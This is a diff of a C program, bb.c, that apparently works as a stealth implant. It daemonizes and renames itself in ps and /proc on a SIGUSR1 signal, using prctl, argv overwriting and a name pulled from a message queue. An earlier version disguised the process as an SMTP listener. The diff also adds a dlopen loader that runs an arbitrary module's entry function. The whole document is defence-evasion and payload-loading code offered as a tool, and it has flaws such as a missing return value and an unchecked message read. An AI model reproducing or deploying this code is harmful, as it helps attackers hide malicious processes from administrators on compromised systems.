@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <signal.h>
 #include <stdlib.h>
@@ -19,16 +20,16 @@
 #include <linux/fs.h>
 #include <sys/ipc.h> 
 #include <sys/msg.h> 
+#include <dlfcn.h>
 
 #include "bb.h"
 
 
-// Save argc/argv. Set name of process
+// gcc -o bb bb.c  -ldl
 
+// Save argc/argv. Set name of process
 char **largv;
 int largc;
-char * name = "smtp: accepting connections";
-int msgid; 
 
 void sig_handler(int signo)
 {
@@ -36,71 +37,80 @@ void sig_handler(int signo)
 #ifdef  BB_DEBUG
     printf("received SIGUSR1\n");
 #endif 
-    // msgrcv to receive message 
-    //msgrcv(msgid, &message, sizeof(message), 1, IPC_NOWAIT); 
-    msgrcv(msgid, &message, sizeof(message), 1, 0); 
-  
-    // display the message 
-#ifdef  BB_DEBUG
-    printf("Data Received is : %s \n",  
-                    message.mesg_text); 
-#endif 
-
-    printf("sending '%s'to setNewName\n",  
-                    message.mesg_text); 
-    // attempt to set new name if and when works 
-    // should be generic enough across linux distros.
-    //setNewName(largc, largv, name);
-    setNewName(largc, largv, message.mesg_text); // check for size
+    setNewName(); // dispatch minimal info from handler
   }
 }
 
 
-/* rename process in ps and proc tables */
-void setNewName(int argc, char *argv[], char* procname){
+/* 
+	get name from an IPC, 
+	rename process in ps and proc tables 
+*/
+int setNewName(void){
 
+	key_t key; 
+	int msgid;
 
-	 printf("setNewName before step 1\n");
+	// structure for message queue 
+	struct mesg_buffer { 
+		 long mesg_type; 
+		 char mesg_text[100]; 
+	} message; 
+
+   // ftok to generate unique key 
+   key = ftok("/", 65); 
+   printf("KEY: %d\n", key);
+  
+   // msgget wants a message queue with info, 
+	// create if not present,
+   // return identifier 
+   msgid = msgget(key, 0666 | IPC_CREAT); 
+   printf("MSGID: %d\n", msgid);
+
+    // msgrcv to receive message 
+   msgrcv(msgid, &message, sizeof(message), 1, IPC_NOWAIT); 
+
+	char* procname = message.mesg_text;
+
+	// to destroy the message queue 
+   // msgctl(msgid, IPC_RMID, NULL); 
+   // printf("message q destroyed: %d\n", msgid); 
+
+	printf("Setting procname: %s\n", procname);
     // Step 1: set proc name
     // By itself this change does not reflect in PS table (from /proc/pid/cmd)
     // only in /proc/pid/comm
 	 // FYI: procname is up to 16 bytes.
-    if (prctl(PR_SET_NAME, (unsigned long) procname, 0, 0, 0) != 0) {
+   if (prctl(PR_SET_NAME, (unsigned long) procname, 0, 0, 0) != 0) {
 
 //#ifdef  BB_DEBUG
         fprintf(stderr, "Got error '%s' when setting process name with prctl() to '%s'\n", strerror(errno), procname);
 //#endif
 		  ;
     } 
-	 printf("setNewName after prctl\n");
+
 
    // Step 2: hijack argv[]
    // ref: https://stackoverflow.com/questions/4461289/change-thread-name-on-linux-htop
    // Then let's directly modify the arguments
    // This needs a pointer to the original arvg, as passed to main(),
    // and is limited to the length of the original argv[0]
-	 printf("argv[0]: %s\n", argv[0]);
-   size_t argv0_len = strlen(argv[0]);
-	 printf("strlen argv[0] %d\n", argv0_len);
+   size_t argv0_len = strlen(largv[0]);
    size_t procname_len = strlen(procname);
-	 printf("procname_len %d\n", procname_len);
    size_t max_procname_len = (argv0_len > procname_len) ? (procname_len) : (argv0_len);
-	 printf("max_procname_len %d\n", max_procname_len);
 
-	printf("setNewName before strncopy\n");
    // Copy the maximum size of a name
-   strncpy(argv[0], procname, max_procname_len);
+   strncpy(largv[0], procname, max_procname_len);
    // Clear out the rest (yes, this is needed, or the remaining part of the old
    // process name will still show up in ps)
-   memset(&argv[0][max_procname_len], '\0', argv0_len - max_procname_len);
-	 printf("setNewName after argv[0]  memset\n");
+   memset(&largv[0][max_procname_len], '\0', argv0_len - max_procname_len);
 
    // Clear the other passed arguments, optional
    // Needs to know argv and argc as passed to main()
-   /* for (size_t i = 1; i < largc; i++) {
-	  printf("setNewName memset argv[i]");
-     memset(argv[i], '\0', strlen(argv[i]));
-   }*/
+    for (size_t i = 1; i < largc; i++) {
+     memset(largv[i], '\0', strlen(largv[i]));
+   }
+
 
 }
 
@@ -132,31 +142,26 @@ void backgroundDaemonLeader(void){
 
 void hookSignal(int signo){
 	// Set Signal handler for name change
-   if (signal(SIGUSR1, sig_handler) == SIG_ERR){
+   if (signal(signo, sig_handler) == SIG_ERR){
 #ifdef BB_DEBUG
-  		printf("\ncan't catch SIGINT\n");
+  		printf("\ncan't catch signal\n");
 #endif     
 	 ;
 	}
 }
 
-void hookNameSource(void){
-	key_t key; 
-  
-   // ftok to generate unique key 
-   key = ftok("/", 65); 
-   printf("KEY: %d\n", key);
-  
-   // msgget creates a message queue 
-   // and returns identifier 
-   msgid = msgget(key, 0666 | IPC_CREAT); 
-   printf("MSGID: %d\n", msgid);
   
   
-}
 /*------------------------------------*/
 int main(int argc, char** argv) {
        
+
+	 if (argc != 2){
+       fprintf(stderr, "Usage: %s <module.so>\n", argv[0]);
+       exit(1);
+    }
+
+
 
 	// Save args for processing. They will get overwritten
 	largv = argv;
@@ -168,7 +173,13 @@ int main(int argc, char** argv) {
 	// Rename on command
    hookSignal(SIGUSR1);
 
-	hookNameSource();
+
+	void *handle;
+   void (*entry)(const char*);
+
+   handle = dlopen(argv[1], RTLD_LAZY);
+	*(void**)(&entry) = dlsym(handle, "entry");
+	entry("localhost");
 
 	/* Work! */
    doWork();
